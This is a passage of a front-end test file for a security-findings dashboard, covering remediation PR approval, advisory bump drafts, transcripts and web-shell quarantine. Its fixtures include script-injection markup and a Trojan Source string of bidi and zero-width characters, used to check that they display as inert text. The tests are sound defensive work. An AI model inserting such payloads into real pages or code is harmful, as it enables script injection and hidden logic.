  expect(screen.queryByText(/^Lab /)).not.toBeInTheDocument();
  expect(
    within(screen.getByRole("region", { name: "Remediation PRs" })).getByText(
      "This Verdict's Playbook has no Remediation PR.",
    ),
  ).toBeInTheDocument();
  unmount();
  showFinding({
    ...upstreamFinding,
    playbook: [
      { step: "proof", status: "draft" },
      { step: "disclosure_report", status: "missing" },
      { step: "remediation_pr", status: "no_own_repository" },
    ],
    own_repository: false,
    remediation_actions: [],
  });
  const steps = await screen.findByRole("region", { name: "Playbook" });
  expect(
    within(steps).getByText("No Own repository: skipped"),
  ).toBeInTheDocument();
});

it("shows what the Deployed version check reports, never a guess", async () => {
  const ownFix = (state: string, reason: string) => ({
    ...detail,
    cause: { by: "verdict", verdict: "Vulnerability fix", at },
    deployed_version: state,
    deployed_version_check: { state, version: "1.0.0", reason },
    playbook: [
      { step: "report", status: "ready" },
      { step: "deployed_version_check", status: state },
    ],
    own_repository: true,
  });
  const cases = [
    ["before_fix", "Still serving code from before the fix"],
    ["serving_fix", "Serving the fix"],
    ["unknown", "Unknown"],
  ];
  for (const [state, label] of cases) {
    const { unmount } = showFinding(ownFix(state, `reason for ${state}`));
    const exposure = await screen.findByRole("region", {
      name: "Remote target exposure",
    });
    expect(
      within(exposure).getByText("Deployed version", { selector: "dt" })
        .nextElementSibling,
    ).toHaveTextContent(`${label} reason for ${state}`);
    const playbook = screen.getByRole("region", { name: "Playbook" });
    expect(
      within(playbook).getByText("Deployed version check", { selector: "dt" })
        .nextElementSibling,
    ).toHaveTextContent(label);
    unmount();
  }
});

it("lists a Malicious change with its static Proof, not a Lab badge", async () => {
  vi.stubGlobal(
    "fetch",
    vi.fn(
      async () =>
        new Response(
          JSON.stringify({
            items: [{ ...summary, malicious_change: true, lab_status: null }],
            next_cursor: null,
          }),
        ),
    ),
  );
  render(
    <MemoryRouter>
      <FindingsList />
    </MemoryRouter>,
  );
  expect(
    await screen.findByRole("link", { name: summary.title }),
  ).toBeInTheDocument();
  expect(screen.getByText("Static Proof")).toBeInTheDocument();
  expect(screen.queryByText(/^Lab /)).not.toBeInTheDocument();
});

it("offers no download of an Upstream Proof (A15)", async () => {
  const files = [
    { id: "report", path: "report.md", size: 30, sha256: "a".repeat(64) },
    { id: "poc", path: "poc.py", size: 30, sha256: "b".repeat(64) },
  ];
  const fetch = vi.fn(async (url: string) =>
    url.startsWith("/api/artifacts/")
      ? new Response("# Upstream report")
      : new Response(
          JSON.stringify(
            url.startsWith("/api/applications/")
              ? application
              : { ...upstreamFinding, exportable: false, artifacts: files },
          ),
        ),
  );
  vi.stubGlobal("fetch", fetch);
  render(
    <MemoryRouter initialEntries={["/findings/finding"]}>
      <Routes>
        <Route path="/findings/:id" element={<FindingDetail />} />
      </Routes>
    </MemoryRouter>,
  );
  expect(
    await screen.findByRole("heading", { name: "Upstream report" }),
  ).toBeInTheDocument();
  expect(screen.queryAllByText(/Download/)).toEqual([]);
  expect(
    document.querySelector('a[href*="/download"], a[href*="/content"]'),
  ).toBeNull();
  expect(fetch.mock.calls.map(([url]) => url)).not.toContain(
    "/api/artifacts/poc/content",
  );
});

// A08: a ready patch whose diff carries markup, the Approval it needs, and the PR it opened.
const hash = "d".repeat(64);
const diff = [
  "diff --git a/src/view.js b/src/view.js",
  "index 1111111..2222222 100644",
  "--- a/src/view.js",
  "+++ b/src/view.js",
  "@@ -1 +1 @@",
  "-render('<script>alert(1)</script>');",
  "+render(escape('<script>alert(1)</script>'));",
  "",
].join("\n");
const draft = {
  id: "rpr-1",
  action: "patch",
  status: "ready",
  base_ref: "a".repeat(40),
  diff,
  diff_sha256: hash,
  paths: ["src/view.js"],
  flags: [],
  summary: "Escape the rendered value",
  error: null,
  job_id: "job-draft",
  created_at: at,
  updated_at: at,
};
const remediable = {
  ...detail,
  source_commit_id: "commit-1",
  own_repository: true,
  remediation_actions: ["patch", "revert"],
  remediation_prs: [draft],
};
function serveRemediation(
  finding: Record<string, unknown>,
  approve: () => Response,
) {
  const posted: { url: string; body: unknown }[] = [];
  vi.stubGlobal(
    "fetch",
    vi.fn(async (url: string, init?: RequestInit) => {
      if (url.startsWith("/api/applications/"))
        return new Response(JSON.stringify(application));
      if (init?.method === "POST") {
        posted.push({ url, body: JSON.parse(String(init.body)) });
        return approve();
      }
      return new Response(JSON.stringify(finding));
    }),
  );
  render(
    <MemoryRouter initialEntries={["/findings/finding"]}>
      <Routes>
        <Route path="/findings/:id" element={<FindingDetail />} />
        <Route path="*" element={<p>Navigated away</p>} />
      </Routes>
    </MemoryRouter>,
  );
  return posted;
}
const accepted = () =>
  new Response(
    JSON.stringify({ job_id: "job-pr", status_url: "/api/jobs/job-pr" }),
    { status: 202 },
  );

it("shows a draft Remediation PR diff as text with its hash and approves it with the password", async () => {
  const opened = {
    ...draft,
    id: "rpr-2",
    action: "revert",
    status: "open",
    flags: ["workflows"],
    summary: null,
    branch: "asset-monitor/aaaaaaa-revert",
    pull_number: 7,
    pull_url: "https://github.com/acme/portal/pull/7",
  };
  const posted = serveRemediation(
    {
      ...remediable,
      remediation_prs: [draft, opened],
      events: [
        {
          id: "e1",
          created_at: at,
          action: "approved",
          approved: "remediation_pr",
          remediation: "revert",
          diff_sha256: hash,
        },
        {
          id: "e2",
          created_at: at,
          action: "remediation_pr_opened",
          remediation: "revert",
          branch: "asset-monitor/aaaaaaa-revert",
          pull_number: 7,
          pull_url: "https://github.com/acme/portal/pull/7",
        },
        {
          id: "e3",
          created_at: at,
          action: "remediation_pr_merged",
          remediation: "revert",
          merge_commit_sha: "e".repeat(40),
        },
      ],
    },
    accepted,
  );
  const panel = await screen.findByRole("region", { name: "Remediation PRs" });
  const [patch, revert] = within(panel).getAllByRole("article");
  // The diff is text exactly as it will be pushed: nothing in it is markup.
  expect(patch.querySelector("pre")?.textContent).toBe(diff);
  expect(document.querySelector("script")).toBeNull();
  expect(within(patch).getByText(hash)).toBeInTheDocument();
  expect(within(patch).getByText("Ready")).toBeInTheDocument();
  expect(
    within(patch).getByText("Escape the rendered value"),
  ).toBeInTheDocument();
  expect(
    within(revert).getByText(/changes \.github\/workflows/),
  ).toBeInTheDocument();
  expect(
    within(revert).getByText("asset-monitor/aaaaaaa-revert"),
  ).toBeInTheDocument();
  const link = within(revert).getByRole("link", { name: /Pull request #7/ });
  expect(link).toHaveAttribute("href", "https://github.com/acme/portal/pull/7");
  expect(link).toHaveAttribute("rel", "noreferrer");
  // An opened PR is not approved again.
  expect(
    within(revert).queryByRole("button", { name: "Approve" }),
  ).not.toBeInTheDocument();
  const history = screen.getByRole("region", { name: "History" });
  expect(
    within(history).getByText("Approved · Remediation PR"),
  ).toBeInTheDocument();
  expect(
    within(history).getByText("Remediation PR opened"),
  ).toBeInTheDocument();
  expect(
    within(history).getByText("Remediation PR merged"),
  ).toBeInTheDocument();

  const user = userEvent.setup();
  await user.click(within(patch).getByRole("button", { name: "Approve" }));
  const dialog = await screen.findByRole("dialog");
  expect(dialog).toHaveTextContent(hash);
  const password = within(dialog).getByLabelText("Password");
  expect(password).toHaveAttribute("type", "password");
  await user.type(password, "test-password-long");
  await user.click(within(dialog).getByRole("button", { name: "Approve" }));
  await vi.waitFor(() =>
    expect(screen.queryByRole("dialog")).not.toBeInTheDocument(),
  );
  expect(posted).toEqual([
    {
      url: "/api/findings/finding/remediation-prs/rpr-1/approvals",
      body: { password: "test-password-long", diff_sha256: hash },
    },
  ]);
});

it("a refused Remediation PR Approval keeps the dialog", async () => {
  const posted = serveRemediation(
    remediable,
    () =>
      new Response(
        JSON.stringify({
          code: "approval_refused",
          message: "The password is incorrect; nothing was approved",
        }),
        { status: 403 },
      ),
  );
  const panel = await screen.findByRole("region", { name: "Remediation PRs" });
  const user = userEvent.setup();
  await user.click(within(panel).getByRole("button", { name: "Approve" }));
  const dialog = await screen.findByRole("dialog");
  await user.type(within(dialog).getByLabelText("Password"), "wrong-password");
  await user.click(within(dialog).getByRole("button", { name: "Approve" }));
  expect(
    await within(dialog).findByText(
      "The password is incorrect; nothing was approved",
    ),
  ).toBeInTheDocument();
  expect(screen.getByRole("dialog")).toBeInTheDocument();
  expect(screen.queryByText("Navigated away")).not.toBeInTheDocument();
  expect(posted).toHaveLength(1);
});

it("without an Own repository Remediation PRs are skipped", async () => {
  showFinding({
    ...detail,
    own_repository: false,
    remediation_actions: [],
    remediation_prs: [],
  });
  const panel = await screen.findByRole("region", { name: "Remediation PRs" });
  expect(
    within(panel).getByText(
      "No Own repository: Remediation PR steps are skipped.",
    ),
  ).toBeInTheDocument();
  expect(within(panel).queryAllByRole("button")).toEqual([]);
});

it("drafts a Remediation PR by hand and shows why a step failed", async () => {
  const posted = serveRemediation(
    {
      ...remediable,
      remediation_prs: [
        {
          ...draft,
          status: "failed",
          error: {
            code: "github_write_token_required",
            message: "Add a GitHub write token under Settings, Integrations.",
          },
        },
        {
          ...draft,
          id: "rpr-2",
          action: "revert",
          status: "drafting",
          diff: null,
          diff_sha256: null,
          base_ref: null,
          paths: [],
        },
      ],
    },
    accepted,
  );
  const panel = await screen.findByRole("region", { name: "Remediation PRs" });
  const [failed] = within(panel).getAllByRole("article");
  expect(
    within(failed).getByText(
      "Add a GitHub write token under Settings, Integrations.",
    ),
  ).toBeInTheDocument();
  // A failed PR step is approved again; a revert still drafting is not drafted twice.
  expect(within(failed).getByRole("button", { name: "Approve" })).toBeEnabled();
  expect(
    within(panel).getByRole("button", { name: "Draft revert" }),
  ).toBeDisabled();
  await userEvent
    .setup()
    .click(within(panel).getByRole("button", { name: "Draft patch" }));
  await vi.waitFor(() =>
    expect(posted).toEqual([
      {
        url: "/api/findings/finding/remediation-prs",
        body: { action: "patch" },
      },
    ]),
  );
});

it("shows a diff's bidi and zero-width characters as visible escapes", async () => {
  // Trojan Source: the comment's right-to-left override hides where the code really ends.
  const tricky =
    "+check(user); /* \u202E } \u2066if (admin)\u2069 \u202C */\u200B\n";
  serveRemediation(
    { ...remediable, remediation_prs: [{ ...draft, diff: diff + tricky }] },
    accepted,
  );
  const panel = await screen.findByRole("region", { name: "Remediation PRs" });
  const text = panel.querySelector("pre")?.textContent ?? "";
  expect(text).toContain(
    "/* ⟨U+202E⟩ } ⟨U+2066⟩if (admin)⟨U+2069⟩ ⟨U+202C⟩ */⟨U+200B⟩",
  );
  expect(text).not.toMatch(/[\u200B\u202C\u202E\u2066\u2069]/);
  expect(within(panel).getByText("Hidden characters")).toBeInTheDocument();
  // The hash, and so the Approval, is still of the diff's own bytes.
  expect(within(panel).getByText(hash)).toBeInTheDocument();
});

// A09 and A06: an advisory Finding gets a report and a bump Remediation PR, never a Lab Proof.
const CVE = "CVE-2026-111497";
const advisoryReport = `${CVE} (also BIT-node-2026-111497, GHSA-9c4w-m7v2-x5qh)\nSeverity: high\n\n<script>alert('report')</script>\n`;
const bumpDiff = [
  "diff --git a/Dockerfile b/Dockerfile",
  "--- a/Dockerfile",
  "+++ b/Dockerfile",
  "@@ -1 +1 @@",
  "-FROM node:20.11.1-alpine",
  "+FROM node:20.19.5-alpine",
  "",
].join("\n");
const advisoryFinding = {
  ...detail,
  source: "advisory",
  source_ref: CVE,
  title: "node 20.11.1: Node.js request smuggling (fixture)",
  cause: { by: "advisory", advisory_id: CVE, at },
  target_applicability: "affected",
  lab_runs: [],
  artifact_state: {
    status: "draft",
    missing: ["report.md", "poc.py"],
    limitations: [],
    vulnerable_version: null,
  },
  playbook: [
    { step: "report", status: "ready" },
    { step: "remediation_pr", status: "ready" },
  ],
  own_repository: true,
  remediation_actions: ["bump"],
  remediation_prs: [
    {
      ...draft,
      id: "rpr-bump",
      action: "bump",
      subject: CVE,
      diff: bumpDiff,
      paths: ["Dockerfile"],
      summary: "Bumps node to 20.19.5 (Dockerfile)",
      dependency: {
        ecosystem: "runtime",
        name: "node",
        version: "20.19.5",
        edits: [
          {
            source: "Dockerfile",
            field: "dockerfile",
            from: "node:20.11.1-alpine",
            to: "node:20.19.5-alpine",
          },
        ],
      },
    },
  ],
  advisories: [
    {
      id: "match-1",
      vulnerability: CVE,
      aliases: ["BIT-node-2026-111497", CVE, "GHSA-9c4w-m7v2-x5qh"],
      state: "exposed",
      finding_id: "finding",
      summary: "<script>alert('report')</script>",
      severity: "high",
      feeds: ["ghsa", "nvd", "osv"],
      references: [],
      pins: [
        {
          kind: "runtime",
          ecosystem: null,
          name: "node",
          version: "20.11.1",
          sources: ["Dockerfile"],
          ranges: {
            osv: [
              [
                [">=", "20.0.0"],
                ["<", "20.19.5"],
              ],
              [
                [">=", "22.0.0"],
                ["<", "22.12.0"],
              ],
            ],
            nvd: [
              [
                [">=", "20.0.0"],
                ["<", "20.19.5"],
              ],
            ],
          },
          state: "exposed",
        },
      ],
      report: advisoryReport,
      updated_at: at,
    },
  ],
};

it("shows an advisory Finding's report, aliases, ranges, pinned version and bump draft", async () => {
  const { container, unmount } = showFinding(advisoryFinding);
  const panel = await screen.findByRole("region", { name: `Advisory ${CVE}` });
  // The report is text: the markup in it is never rendered.
  expect(panel.querySelector("pre")?.textContent).toBe(advisoryReport);
  expect(container.querySelector("script")).toBeNull();
  expect(
    within(panel).getByRole("button", { name: "Copy the advisory report" }),
  ).toBeInTheDocument();
  const row = (label: string) =>
    within(panel).getByText(label, { selector: "dt" }).nextElementSibling;
  expect(row("Aliases")).toHaveTextContent("BIT-node-2026-111497");
  expect(row("Aliases")).toHaveTextContent("GHSA-9c4w-m7v2-x5qh");
  expect(row("Exposure")).toHaveTextContent("Exposed");
  const [pin] = within(panel).getAllByRole("row").slice(1);
  expect(pin).toHaveTextContent("node");
  expect(pin).toHaveTextContent("20.11.1");
  expect(pin).toHaveTextContent("Dockerfile");
  expect(pin).toHaveTextContent("osv: >=20.0.0 <20.19.5 || >=22.0.0 <22.12.0");
  expect(pin).toHaveTextContent("nvd: >=20.0.0 <20.19.5");
  expect(row("Lowest fixed version")).toHaveTextContent(
    "node 20.19.5 · Dockerfile: node:20.11.1-alpine → node:20.19.5-alpine",
  );
  const playbook = screen.getByRole("region", { name: "Playbook" });
  const state = (step: string) =>
    within(playbook).getByText(step, { selector: "dt" }).nextElementSibling;
  expect(state("Report")).toHaveTextContent("Ready");
  expect(state("Remediation PR")).toHaveTextContent(
    "Waiting for your Approval",
  );
  // No Lab Proof: no Lab, no Lab badge and no Draft bundle callout.
  expect(screen.queryByRole("region", { name: "Lab" })).not.toBeInTheDocument();
  expect(screen.queryByText(/^Lab /)).not.toBeInTheDocument();
  expect(screen.queryByText("Draft bundle")).not.toBeInTheDocument();
  // The bump draft's diff, waiting for Approval.
  const prs = screen.getByRole("region", { name: "Remediation PRs" });
  expect(prs.querySelector("pre")?.textContent).toBe(bumpDiff);
  expect(
    within(prs).getByText("Bumps node to 20.19.5 (Dockerfile)"),
  ).toBeInTheDocument();
  expect(within(prs).getByRole("button", { name: "Approve" })).toBeEnabled();
  unmount();

  // A match with no fixed version, or of a package only a lockfile names, drafts nothing.
  for (const [status, label] of [
    ["no_fixed_version", "No fixed version is known yet"],
    [
      "not_direct",
      "Not a direct dependency: update the package that pulls it in",
    ],
  ]) {
    const { unmount } = showFinding({
      ...advisoryFinding,
      playbook: [
        { step: "report", status: "ready" },
        { step: "remediation_pr", status },
      ],
      remediation_actions: [],
      remediation_prs: [],
    });
    const steps = await screen.findByRole("region", { name: "Playbook" });
    expect(within(steps).getByText(label)).toBeInTheDocument();
    const advisory = screen.getByRole("region", { name: `Advisory ${CVE}` });
    expect(
      within(advisory).getByText("Lowest fixed version", { selector: "dt" })
        .nextElementSibling,
    ).toHaveTextContent(label);
    unmount();
  }
});

it("shows a Finding's Transcripts as text", async () => {
  // A14, A15: the agent's own words, markup included, are only ever text.
  const text = "[assistant]\n<script>alert('transcript')</script>\npi> done";
  const transcripts = [
    {
      id: "triage-run",
      kind: "triage",
      job_id: "job-triage",
      analysis_id: null,
    },
    {
      id: "analysis-run",
      kind: "analysis",
      job_id: "job-analysis",
      analysis_id: "analysis",
    },
  ].map((row) => ({
    ...row,
    subject_id: "commit",
    status: "completed",
    created_at: at,
  }));
  const fetch = vi.fn(
    async (url: string) =>
      new Response(
        JSON.stringify(
          url.startsWith("/api/applications/")
            ? application
            : url.startsWith("/api/transcripts/")
              ? { ...transcripts[1], text }
              : { ...detail, transcripts },
        ),
      ),
  );
  vi.stubGlobal("fetch", fetch);
  const { container } = render(
    <MemoryRouter initialEntries={["/findings/finding"]}>
      <Routes>
        <Route path="/findings/:id" element={<FindingDetail />} />
      </Routes>
    </MemoryRouter>,
  );
  const panel = await screen.findByRole("region", { name: "Transcripts" });
  const [triage, analysis] = within(panel).getAllByRole("article");
  expect(triage).toHaveTextContent("Triage");
  expect(
    within(triage).getByRole("link", { name: /View job/ }),
  ).toHaveAttribute("href", "/jobs/job-triage");
  expect(analysis).toHaveTextContent("Analysis");
  expect(panel.querySelector("pre")).toBeNull();
  await userEvent
    .setup()
    .click(within(analysis).getByRole("button", { name: "Show" }));
  await vi.waitFor(() =>
    expect(analysis.querySelector("pre")?.textContent).toBe(text),
  );
  expect(fetch).toHaveBeenCalledWith(
    "/api/transcripts/analysis-run",
    expect.anything(),
  );
  expect(container.querySelector("script")).toBeNull();
  expect(
    within(analysis).getByRole("button", { name: "Hide" }),
  ).toHaveAttribute("aria-expanded", "true");
});

it("approves a Quarantine with the list hash and warns that a Restore puts the payload back", async () => {
  const posted: { url: string; body: unknown }[] = [];
  const shell = { root: "/var/www/html", path: "wp-content/uploads/cache.php", sha256: "a".repeat(64) };
  vi.stubGlobal(
    "fetch",
    vi.fn(async (url: string, init?: RequestInit) => {
      if (url.startsWith("/api/applications/"))
        return new Response(JSON.stringify(application));
      if (init?.method === "POST") {
        posted.push({ url, body: JSON.parse(String(init.body)) });
        return new Response(JSON.stringify({ id: "cmd" }), { status: 202 });
      }
      return new Response(
        JSON.stringify({
          ...detail,
          source: "server_files",
          source_ref: "web-1",
          status: "confirmed",
          lab_runs: [],
          server_files: [shell],
          regressed_at: null,
          quarantine: {
            agent_id: "agent",
            agent_name: "web-1",
            agent_status: "enrolled",
            list: [shell],
            list_sha256: "b".repeat(64),
            commands: [
              {
                id: "q-1",
                name: "quarantine",
                sequence: 3,
                status: "done",
                expires_at: "2026-11-15T00:15:00Z",
                created_at: "2026-11-15T00:00:00Z",
                list_sha256: "b".repeat(64),
                files: [{ ...shell, quarantine_id: "c".repeat(32), status: "quarantined" }],
                restore: { entries: ["c".repeat(32)], entries_sha256: "d".repeat(64) },
              },
            ],
            quarantined: [{ ...shell, quarantine_id: "c".repeat(32), command_id: "q-1" }],
          },
        }),
      );
    }),
  );
  render(
    <MemoryRouter initialEntries={["/findings/finding"]}>
      <Routes>
        <Route path="/findings/:id" element={<FindingDetail />} />
      </Routes>
    </MemoryRouter>,
  );
  expect(await screen.findAllByText("wp-content/uploads/cache.php")).toHaveLength(2);
  expect(screen.getByText("Quarantined")).toBeInTheDocument();
  const user = userEvent.setup();
  await user.click(screen.getByRole("button", { name: "Approve Quarantine" }));
  const quarantine = await screen.findByRole("dialog");
  expect(within(quarantine).getByText(new RegExp(`list SHA-256 ${"b".repeat(64)}`))).toBeInTheDocument();
  await user.type(within(quarantine).getByLabelText("Password"), "test-password-long");
  await user.click(within(quarantine).getByRole("button", { name: "Approve" }));
  await vi.waitFor(() => expect(screen.queryByRole("dialog")).not.toBeInTheDocument());
  await user.click(screen.getByRole("button", { name: "Restore" }));
  const dialog = await screen.findByRole("dialog");
  expect(
    within(dialog).getByText(/this Finding is Confirmed, so restoring puts the payload back/),
  ).toBeInTheDocument();
  await user.type(within(dialog).getByLabelText("Password"), "test-password-long");
  await user.click(within(dialog).getByRole("button", { name: "Approve" }));
  await vi.waitFor(() => expect(screen.queryByRole("dialog")).not.toBeInTheDocument());
  expect(posted).toEqual([
    {
      url: "/api/findings/finding/quarantines",
      body: { list_sha256: "b".repeat(64), password: "test-password-long" },
    },
    {
      url: "/api/findings/finding/restores",
      body: { command_id: "q-1", entries_sha256: "d".repeat(64), password: "test-password-long" },
    },
  ]);
});
